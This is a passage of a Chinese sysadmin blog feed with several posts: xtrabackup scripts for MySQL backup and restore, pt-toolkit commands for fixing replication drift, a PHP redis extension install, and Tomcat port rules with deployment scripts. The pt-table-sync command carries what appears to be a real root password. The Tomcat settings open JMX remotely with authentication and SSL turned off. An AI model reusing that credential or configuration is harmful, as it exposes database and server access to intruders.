<a id="more"></a>
<h1 id="一-安装xtrabackup"><a href="#一-安装xtrabackup" class="headerlink" title="一.安装xtrabackup"></a>一.安装xtrabackup</h1><p>在使用该脚本之前必须按照xtrabackup，按照命令如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rpm -qa |grep xtrabackup</div></pre></td></tr></table></figure></p>
<p>如果存在老版本，就卸载<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rpm <span class="_">-e</span> --nodeps xtrabackup</div></pre></td></tr></table></figure></p>
<p>安装新版本<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install -y percona-xtrabackup.x86_64</div></pre></td></tr></table></figure></p>
<p>安装qpress用于xtrabackup的恢复还原<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install -y qpress</div></pre></td></tr></table></figure></p>
<p><strong>注意:</strong> xtrabackup的版本一定是2.2.3以上 </p>
<h1 id="二-xtrabackup的shell备份脚本"><a href="#二-xtrabackup的shell备份脚本" class="headerlink" title="二.xtrabackup的shell备份脚本"></a>二.xtrabackup的shell备份脚本</h1><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><p>使用下面的shell脚本，需要根据不同数据库实例的自身情况，为以下变量设置不同的值</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">HOST_IP=<span class="string">'10.1.17.19'</span>                    <span class="comment">#备份实例服务器的IP地址</span></div><div class="line">MYSQL_PWD=<span class="string">"xxx"</span>          				<span class="comment">#mysql用户debian-sys-maint的密码</span></div><div class="line">MYSQL_SOCKET=<span class="string">"xxx"</span>       				<span class="comment">#mysql实例的socket，eg. /tmp/mysql.sock</span></div><div class="line">MYSQL_PORT=3306                         <span class="comment">#mysql的端口</span></div><div class="line">MYSQL_CNF_FILE=<span class="string">"/etc/my.cnf"</span>            <span class="comment">#mysql实例的配置文件</span></div><div class="line">INSTNANCE_NAME=<span class="string">"inventory"</span>              <span class="comment">#mysql实例名</span></div><div class="line"></div><div class="line"><span class="comment"># 根据不同存储设置不同的值。FIO 为16， SAS为8</span></div><div class="line"><span class="comment"># 也可以根据mysql实例的io负载的具体情况增大或减少值</span></div><div class="line"></div><div class="line">RUN_THREAD_NUM=8</div><div class="line">COMPRESS_THREAD_NUM=8</div></pre></td></tr></table></figure>
<p><strong>mysql备份shell脚本</strong></p>
<p>mysql备份shell如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line">INNOBACKUPEX=`<span class="built_in">which</span> innobackupex`</div><div class="line">CURL=`<span class="built_in">which</span> curl`</div><div class="line">RSYNC=`<span class="built_in">which</span> rsync`</div><div class="line">BWLIMIT=40960 <span class="comment">#40MB</span></div><div class="line"></div><div class="line">HOST_IP=<span class="string">'192.168.1.21'</span></div><div class="line">REMOTE_IP=<span class="string">'192.168.10.54'</span></div><div class="line"></div><div class="line">MYSQL_USER=<span class="string">"debian-sys-maint"</span></div><div class="line">MYSQL_PWD=<span class="string">"xxx"</span></div><div class="line">MYSQL_SOCKET=<span class="string">"/tmp/mysqld.sock"</span></div><div class="line">MYSQL_PORT=3306</div><div class="line">MYSQL_CNF_FILE=<span class="string">"/etc/my.cnf"</span></div><div class="line">INSTNANCE_NAME=<span class="string">"inventory"</span></div><div class="line"></div><div class="line">BACKUP_DIR=<span class="string">"/home/jm/backup"</span></div><div class="line">BACKUP_FILE=<span class="string">"mysql-"</span><span class="variable">$INSTNANCE_NAME</span></div><div class="line">BACKUP_FILES_DIR=<span class="string">"mysql-"</span><span class="variable">$INSTNANCE_NAME</span></div><div class="line">TRANSFER_FILE=</div><div class="line"></div><div class="line">WEEK=`date +%w`</div><div class="line"><span class="comment">#WEEK=`date -d yesterday +%w`</span></div><div class="line">CUR_DATE=`date +%F`</div><div class="line"></div><div class="line">RUN_THREAD_NUM=8</div><div class="line">COMPRESS_THREAD_NUM=8</div><div class="line"></div><div class="line">SENTO=<span class="string">"peid1@jumei.com"</span></div><div class="line"></div><div class="line">SUBJECT=<span class="string">"MySQL Instance <span class="variable">$&#123;INSTNANCE_NAME&#125;</span> backup Error"</span></div><div class="line">BACKUP_LOG=<span class="variable">$BACKUP_DIR</span><span class="string">"/backup.log"</span></div><div class="line"></div><div class="line"><span class="function"><span class="title">BINARY_BACKUP</span></span>() &#123;</div><div class="line">		TRANSFER_FILE=<span class="variable">$BACKUP_FILE</span><span class="string">"-"</span><span class="variable">$CUR_DATE</span><span class="string">".xbstream"</span></div><div class="line"> 		<span class="variable">$INNOBACKUPEX</span> --user=<span class="variable">$MYSQL_USER</span>  --password=<span class="variable">$MYSQL_PWD</span> --socket=<span class="variable">$MYSQL_SOCKET</span> --slave-info  --parallel=<span class="variable">$RUN_THREAD_NUM</span> --compress --compress-threads <span class="variable">$COMPRESS_THREAD_NUM</span> --defaults-file=<span class="variable">$MYSQL_CNF_FILE</span> --no-version-check --stream=xbstream  <span class="variable">$BACKUP_DIR</span>  &gt; <span class="variable">$BACKUP_DIR</span>/<span class="variable">$TRANSFER_FILE</span></div><div class="line"></div><div class="line">		sleep 10</div><div class="line"></div><div class="line">		grep <span class="string">"innobackupex: completed OK"</span> <span class="variable">$BACKUP_LOG</span> &gt; /dev/null</div><div class="line"></div><div class="line">		<span class="keyword">if</span> [ $? <span class="_">-eq</span> 0 ]</div><div class="line">			<span class="keyword">then</span></div><div class="line">   			<span class="built_in">echo</span> <span class="string">"Backup finish successfully !"</span></div><div class="line">			<span class="keyword">else</span></div><div class="line">   			<span class="variable">$CURL</span> <span class="_">-d</span> <span class="string">"menu=errorlog"</span> <span class="_">-d</span> email_destinations=<span class="string">"<span class="variable">$SENTO</span>"</span> <span class="_">-d</span> email_subject=<span class="string">"<span class="variable">$SUBJECT</span>"</span> <span class="_">-d</span> email_content=<span class="string">"<span class="variable">$&#123;HOST_IP&#125;</span> MYSQL INSTANCE <span class="variable">$INSTNANCE_NAME</span> backup failed,please check !"</span> http://email.int.jumei.com/send</div><div class="line">		<span class="keyword">fi</span></div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="title">RSYNC_REMOTE</span></span>() &#123;</div><div class="line">		<span class="variable">$RSYNC</span> -av --bwlimit=<span class="variable">$BWLIMIT</span> <span class="variable">$BACKUP_DIR</span>/<span class="variable">$TRANSFER_FILE</span> root@<span class="variable">$&#123;REMOTE_IP&#125;</span>::mysql/</div><div class="line"></div><div class="line">		<span class="keyword">if</span> [ $? <span class="_">-eq</span> 0 ];<span class="keyword">then</span></div><div class="line">        	rm <span class="_">-f</span> <span class="variable">$BACKUP_DIR</span>/<span class="variable">$TRANSFER_FILE</span></div><div class="line">			<span class="keyword">else</span></div><div class="line">  			<span class="variable">$CURL</span> <span class="_">-d</span> <span class="string">"menu=errorlog"</span> <span class="_">-d</span> email_destinations=<span class="string">"<span class="variable">$SENTO</span>"</span> <span class="_">-d</span> email_subject=<span class="string">"<span class="variable">$SUBJECT</span>"</span> <span class="_">-d</span> email_content=<span class="string">"<span class="variable">$&#123;HOST_IP&#125;</span> backup file send to <span class="variable">$&#123;REMOTE_IP&#125;</span> failed,please check !"</span> http://email.int.jumei.com/send</div><div class="line"><span class="keyword">fi</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment"># main procedure</span></div><div class="line"></div><div class="line">BINARY_BACKUP</div><div class="line"></div><div class="line">RSYNC_REMOTE</div></pre></td></tr></table></figure></p>
<p><strong> xtrabackup的shell恢复脚本 </strong></p>
<p>使用方法 <code>./mysql_restore inventory.stream</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line">FILE_NAME=<span class="variable">$1</span></div><div class="line">DES_DIR=/mysql/backup/   <span class="comment">#目标文件夹</span></div><div class="line">DATA_DIR=/mysql/data ＃mysql的数据文件件</div><div class="line">MYSQL_SOCKET=/tmp/mysqld.sock</div><div class="line">SENTO=peid1@jumei.com</div><div class="line"></div><div class="line">mysqladmin ping -S<span class="variable">$MYSQL_SOCKET</span> | grep alive &gt;/dev/null</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ $? == 0 ]</div><div class="line">	<span class="keyword">then</span></div><div class="line">		mysqladmin shutdown -S<span class="variable">$MYSQL_SOCKET</span></div><div class="line">		sleep 10</div><div class="line"><span class="keyword">fi</span></div><div class="line"></div><div class="line">rm -rf <span class="variable">$DATA_DIR</span></div><div class="line"></div><div class="line">[ ! <span class="_">-d</span> <span class="variable">$DES_DIR</span> ] &amp;&amp; mkdir <span class="variable">$DES_DIR</span></div><div class="line"></div><div class="line">xbstream -C <span class="variable">$DES_DIR</span> -x -v &lt; <span class="variable">$FILE_NAME</span></div><div class="line"><span class="comment">#cd $DES_DIR</span></div><div class="line">innobackupex --decompress --parallel=32 <span class="variable">$DES_DIR</span></div><div class="line">innobackupex --apply-log <span class="variable">$DES_DIR</span></div><div class="line">chown -R mysql.mysql <span class="variable">$DES_DIR</span></div><div class="line"></div><div class="line">mv <span class="variable">$DES_DIR</span> <span class="variable">$DATA_DIR</span></div><div class="line">rm <span class="_">-f</span> <span class="variable">$DATA_DIR</span>/ib_logfile*</div><div class="line">mysqld_safe --defaults-file=/etc/my.cnf --user=mysql &amp;</div><div class="line"></div><div class="line">sleep 10</div><div class="line"></div><div class="line">mysqladmin ping -S<span class="variable">$MYSQL_SOCKET</span> | grep alive &gt;/dev/null</div><div class="line"></div><div class="line"><span class="keyword">if</span> [ $? == 0 ]</div><div class="line">	<span class="keyword">then</span></div><div class="line">	/usr/bin/curl <span class="_">-d</span> <span class="string">"menu=errorlog"</span> <span class="_">-d</span> email_destinations=<span class="string">"peid1@jumei.com"</span> <span class="_">-d</span> email_subject=<span class="string">"<span class="variable">$FILE_NAME</span> has been restored"</span> <span class="_">-d</span> email_content=<span class="string">""</span> http://email.int.jumei.com/send</div><div class="line"><span class="keyword">fi</span></div><div class="line"></div><div class="line">mysql -S<span class="variable">$MYSQL_SOCKET</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一般mysql的备份还原会使用mysql自带的mysqldump，但是当数据库比较大多时候，使用mysqldump备份恢复数据库耗时相当的长。为了尽可能的缩短mysql数据库备份恢复的时间窗口，可以使用percona提供的第三方工具xtrabackup来备份还原。&lt;/p&gt;
    
    </summary>
    
      <category term="database" scheme="http://www.unix-like.com/categories/database/"/>
    
    
      <category term="mysql" scheme="http://www.unix-like.com/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>修复mysql主从不一致</title>
    <link href="http://www.unix-like.com/2017/06/08/database/%E4%BF%AE%E5%A4%8Dmysql%E4%B8%BB%E4%BB%8E%E4%B8%8D%E4%B8%80%E8%87%B4/"/>
    <id>http://www.unix-like.com/2017/06/08/database/修复mysql主从不一致/</id>
    <published>2017-06-08T11:35:28.000Z</published>
    <updated>2017-06-10T11:36:33.207Z</updated>
    
    <content type="html"><![CDATA[<h1 id="修复主键冲突"><a href="#修复主键冲突" class="headerlink" title="修复主键冲突"></a>修复主键冲突</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pt-slave-restart --user=root --password=xxxxxx --socket=/gotwo_data/mysqlGo2/my40005/socket/mysqld.sock --error-numbers=1062</div></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="同步不一致的表"><a href="#同步不一致的表" class="headerlink" title="同步不一致的表"></a>同步不一致的表</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pt-table-sync  —<span class="built_in">print</span> --execute --sync-to-master h=192.168.10.41,P=40005,u=root,p=XcQVr8CmHhs4FVN2  --databases=db_go2 --tables=ln_user2seller</div></pre></td></tr></table></figure>
<p>需要在主库上面执行</p>
<p>h= 是从库的IP</p>
<p>P=是从库的端口</p>
<p>–tables= 可以是多个表用逗号分隔</p>
<p>注意使用账户的权限，是否可以登录从库并执行命令</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;修复主键冲突&quot;&gt;&lt;a href=&quot;#修复主键冲突&quot; class=&quot;headerlink&quot; title=&quot;修复主键冲突&quot;&gt;&lt;/a&gt;修复主键冲突&lt;/h1&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;pt-slave-restart --user=root --password=xxxxxx --socket=/gotwo_data/mysqlGo2/my40005/socket/mysqld.sock --error-numbers=1062&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="database" scheme="http://www.unix-like.com/categories/database/"/>
    
    
      <category term="mysql" scheme="http://www.unix-like.com/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>linux下添加redis扩展</title>
    <link href="http://www.unix-like.com/2017/06/08/service/linux%E4%B8%8B%E6%B7%BB%E5%8A%A0redis%E6%89%A9%E5%B1%95/"/>
    <id>http://www.unix-like.com/2017/06/08/service/linux下添加redis扩展/</id>
    <published>2017-06-08T08:33:32.000Z</published>
    <updated>2017-06-08T08:52:50.707Z</updated>
    
    <content type="html"><![CDATA[<p>本文是安装redis扩展，但其他扩展的安装方式也是如此，具有通用性。</p>
<a id="more"></a>
<h1 id="下载扩展"><a href="#下载扩展" class="headerlink" title="下载扩展"></a>下载扩展</h1><p>到<a href="http://pecl.php.net下载扩展" target="_blank" rel="external">http://pecl.php.net下载扩展</a></p>
<h1 id="解压并进入包目录"><a href="#解压并进入包目录" class="headerlink" title="解压并进入包目录"></a>解压并进入包目录</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tar -xvf redis-2.2.7.tar </div><div class="line"><span class="built_in">cd</span> redis-2.2.7</div></pre></td></tr></table></figure>
<h1 id="使用php扩展添加信息"><a href="#使用php扩展添加信息" class="headerlink" title="使用php扩展添加信息"></a>使用php扩展添加信息</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/data/apps/php/bin/phpize</div></pre></td></tr></table></figure>
<h1 id="添加PHP配置信息"><a href="#添加PHP配置信息" class="headerlink" title="添加PHP配置信息"></a>添加PHP配置信息</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure --with-php-config=/data/apps/php/bin/php-config</div></pre></td></tr></table></figure>
<h1 id="编译生成扩展库"><a href="#编译生成扩展库" class="headerlink" title="编译生成扩展库"></a>编译生成扩展库</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">make </div><div class="line">sudo make install</div></pre></td></tr></table></figure>
<h1 id="查看扩展库生成"><a href="#查看扩展库生成" class="headerlink" title="查看扩展库生成"></a>查看扩展库生成</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /goto_data/Application/php/lib/php/extensions/no-debug-non-zts-20090626/</div><div class="line">ls    <span class="comment">#是否有redis.so</span></div></pre></td></tr></table></figure>
<h1 id="修改php-ini"><a href="#修改php-ini" class="headerlink" title="修改php.ini"></a>修改php.ini</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /data/apps/php/etc/</div><div class="line">sudo vim php.ini</div></pre></td></tr></table></figure>
<p>文件末尾添加 extension=redis.so 即可。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是安装redis扩展，但其他扩展的安装方式也是如此，具有通用性。&lt;/p&gt;
    
    </summary>
    
      <category term="service" scheme="http://www.unix-like.com/categories/service/"/>
    
    
      <category term="php" scheme="http://www.unix-like.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat环境搭建及配置规范</title>
    <link href="http://www.unix-like.com/2017/06/08/service/tomcat%E8%BD%AF%E4%BB%B6%E9%83%A8%E7%BD%B2%E5%8F%8A%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E8%84%9A%E6%9C%AC/"/>
    <id>http://www.unix-like.com/2017/06/08/service/tomcat软件部署及项目部署脚本/</id>
    <published>2017-06-08T02:11:56.000Z</published>
    <updated>2017-06-08T02:29:56.491Z</updated>
    
    <content type="html"><![CDATA[<h1 id="软件版本及安装路径"><a href="#软件版本及安装路径" class="headerlink" title="软件版本及安装路径"></a>软件版本及安装路径</h1><p>JDK的版本1.7.0_79 </p>
<p>Tomcat的版本7.0.65</p>
<p>JDK的安装路径: /gotwo_data/Application </p>
<p>Tomcat的安装路径: /gotwo_data/Application</p>
<p>tomcat目录的命名规则:tomcat+对外提供服务的web端口号，比如tomcat18080。 </p>
<p>Tomcat目录及其内部的子目录和文件权限:<code>chown -R tomcat.tomcat tomcat18080;chmod -R 775 tomcat18080</code></p>
<a id="more"></a>
<h1 id="Tomcat端口的配置规范"><a href="#Tomcat端口的配置规范" class="headerlink" title="Tomcat端口的配置规范"></a>Tomcat端口的配置规范</h1><ul>
<li>所有端口为5位数：</li>
<li>前3位数代表单独的web应用</li>
<li>第4位为web应用的多个tomcat实例序号</li>
<li>第5位表示提供不同服务的端口：<pre><code>0:表示web服务端口
3:表示SSL的连接端口
5:表示用于停止Tomcat的端口
8:jmx远程访问端口
9:Apache的侦听端口
</code></pre></li>
</ul>
<h1 id="配置catalina-sh"><a href="#配置catalina-sh" class="headerlink" title="配置catalina.sh"></a>配置catalina.sh</h1><p>加入下面的配置项(以18080为例)：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> JAVA_HOME=/gotwo_data/Application/jdk1.7.0_79</div><div class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$JAVA_HOME</span>/jre/lib/rt.jar:<span class="variable">$JAVA_HOME</span>/lib/dt.jar:<span class="variable">$JAVA_HOME</span>/lib/tools.jar</div><div class="line"><span class="built_in">export</span> TOMCAT_HOME=/gotwo_data/Application/tomcat18080</div><div class="line"><span class="built_in">export</span> CATALINA_HOME=/gotwo_data/Application/tomcat18080</div><div class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin</div><div class="line"></div><div class="line">JAVA_OPTS=<span class="string">" -server -Xms2048M -Xmx2048M -XX:PermSize=256M -XX:MaxPermSize=256M -Xss256k -XX:+PrintGCDetails -Xloggc:/gotwo_data/Application/tomcat18080/logs/gc18080.log"</span></div><div class="line"></div><div class="line">CATALINA_OPTS=<span class="string">"-Djava.rmi.server.hostname=192.168.2.64 -Dcom.sun.management.jmxremote.port=18088 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false"</span></div></pre></td></tr></table></figure>
<h1 id="配置server-xml"><a href="#配置server-xml" class="headerlink" title="配置server.xml"></a>配置server.xml</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;Server port=<span class="string">"18085"</span> shutdown=<span class="string">"SHUTDOWN"</span>&gt; 此端口为关闭本tomcat实例的端口, 必须设置, 且各个tomcat实例之间不能重复.</div><div class="line"></div><div class="line">&lt;Connector URIEncoding=<span class="string">"UTF-8"</span> connectionTimeout=<span class="string">"20000"</span> port=<span class="string">"18080"</span> protocol=<span class="string">"org.apache.coyote.http11.Http11NioProtocol"</span> redirectPort=<span class="string">"18083"</span>/&gt;</div><div class="line"></div><div class="line">&lt;Connector port=<span class="string">"18089"</span> protocol=<span class="string">"AJP/1.3"</span> redirectPort=<span class="string">"18083"</span> /&gt;</div></pre></td></tr></table></figure>
<h1 id="tomcat软件部署脚本"><a href="#tomcat软件部署脚本" class="headerlink" title="tomcat软件部署脚本"></a>tomcat软件部署脚本</h1><p>deploy_tomcat.sh， 使用该脚本部署新tomcat的命令如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo sh deploy_tomcat.sh  180 1 /gotwo_data/deploy/photography-2.0.war</div></pre></td></tr></table></figure></p>
<p>180：表示该tomcat实例的前3位端口号</p>
<p>1: 表示该tomcat实例的第4位端口号</p>
<p>/gotwo_data/deploy/photography-2.0.war  ： 表示要部署的war包</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line">PROJ_CODE=<span class="variable">$1</span></div><div class="line">TOMCAT_SEQ=<span class="variable">$2</span></div><div class="line">PROJ_PKG=<span class="variable">$3</span></div><div class="line"></div><div class="line">WEB_PORT=<span class="string">"<span class="variable">$&#123;PROJ_CODE&#125;</span><span class="variable">$&#123;TOMCAT_SEQ&#125;</span>0"</span></div><div class="line">SSL_PORT=<span class="string">"<span class="variable">$&#123;PROJ_CODE&#125;</span><span class="variable">$&#123;TOMCAT_SEQ&#125;</span>3"</span></div><div class="line">SHUTDOWN_PORT=<span class="string">"<span class="variable">$&#123;PROJ_CODE&#125;</span><span class="variable">$&#123;TOMCAT_SEQ&#125;</span>5"</span></div><div class="line">JMX_PORT=<span class="string">"<span class="variable">$&#123;PROJ_CODE&#125;</span><span class="variable">$&#123;TOMCAT_SEQ&#125;</span>8"</span></div><div class="line">APACHE_PORT=<span class="string">"<span class="variable">$&#123;PROJ_CODE&#125;</span><span class="variable">$&#123;TOMCAT_SEQ&#125;</span>9"</span></div><div class="line"></div><div class="line">TOMCAT_PKG=<span class="string">"/gotwo_data/scripts/template/tomcat"</span></div><div class="line">DEST_TOMCAT_DIR=<span class="string">"/gotwo_data/Application/tomcat<span class="variable">$&#123;WEB_PORT&#125;</span>"</span></div><div class="line">CATA_TEMPLATE=<span class="string">"<span class="variable">$&#123;DEST_TOMCAT_DIR&#125;</span>/bin/catalina.sh"</span></div><div class="line">XML_TEMPLATE=<span class="string">"<span class="variable">$&#123;DEST_TOMCAT_DIR&#125;</span>/conf/server.xml"</span></div><div class="line"></div><div class="line"><span class="comment">#echo $DEST_TOMCAT_DIR</span></div><div class="line"><span class="comment">#echo $CATA_TEMPLATE</span></div><div class="line"><span class="comment">#echo $XML_TEMPLATE</span></div><div class="line"></div><div class="line">cp -r <span class="variable">$TOMCAT_PKG</span> <span class="variable">$DEST_TOMCAT_DIR</span></div><div class="line"></div><div class="line">sed -i <span class="string">"s/##WEB_PORT##/<span class="variable">$&#123;WEB_PORT&#125;</span>/g"</span> <span class="variable">$XML_TEMPLATE</span></div><div class="line">sed -i <span class="string">"s/##SSL_PORT##/<span class="variable">$&#123;SSL_PORT&#125;</span>/g"</span> <span class="variable">$XML_TEMPLATE</span></div><div class="line">sed -i <span class="string">"s/##SHUTDOWN_PORT##/<span class="variable">$&#123;SHUTDOWN_PORT&#125;</span>/g"</span> <span class="variable">$XML_TEMPLATE</span></div><div class="line"></div><div class="line">sed -i <span class="string">"s/##WEB_PORT##/<span class="variable">$&#123;WEB_PORT&#125;</span>/g"</span> <span class="variable">$CATA_TEMPLATE</span></div><div class="line">sed -i <span class="string">"s/##JMX_PORT##/<span class="variable">$&#123;JMX_PORT&#125;</span>/g"</span> <span class="variable">$CATA_TEMPLATE</span></div><div class="line"></div><div class="line">rm -rf <span class="variable">$&#123;DEST_TOMCAT_DIR&#125;</span>/webapps/*</div><div class="line">cp <span class="variable">$PROJ_PKG</span> <span class="variable">$&#123;DEST_TOMCAT_DIR&#125;</span>/webapps/ROOT.war</div><div class="line"></div><div class="line">chown -R tomcat.tomcat <span class="variable">$DEST_TOMCAT_DIR</span></div></pre></td></tr></table></figure>
<h1 id="tomcat项目部署脚本"><a href="#tomcat项目部署脚本" class="headerlink" title="tomcat项目部署脚本"></a>tomcat项目部署脚本</h1><p>deploy_proj.sh， 使用该脚本部署新tomcat的命令如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo sh deploy_proj.sh  18010 /gotwo_data/deploy/photography-2.0.war</div></pre></td></tr></table></figure></p>
<p>18010：表示该tomcat实例的端口号</p>
<p>/gotwo_data/deploy/photography-2.0.war  ： 表示要部署的war包</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line">TOMCAT_PORT=<span class="variable">$1</span></div><div class="line">PROJ_FILE=<span class="variable">$2</span></div><div class="line"></div><div class="line">BASE_DIR=<span class="string">"/gotwo_data/Application/tomcat"</span></div><div class="line">TOMCAT_DIR=<span class="string">"<span class="variable">$&#123;BASE_DIR&#125;</span><span class="variable">$&#123;TOMCAT_PORT&#125;</span>"</span></div><div class="line">WORK_DIR=<span class="string">"<span class="variable">$&#123;TOMCAT_DIR&#125;</span>/work"</span></div><div 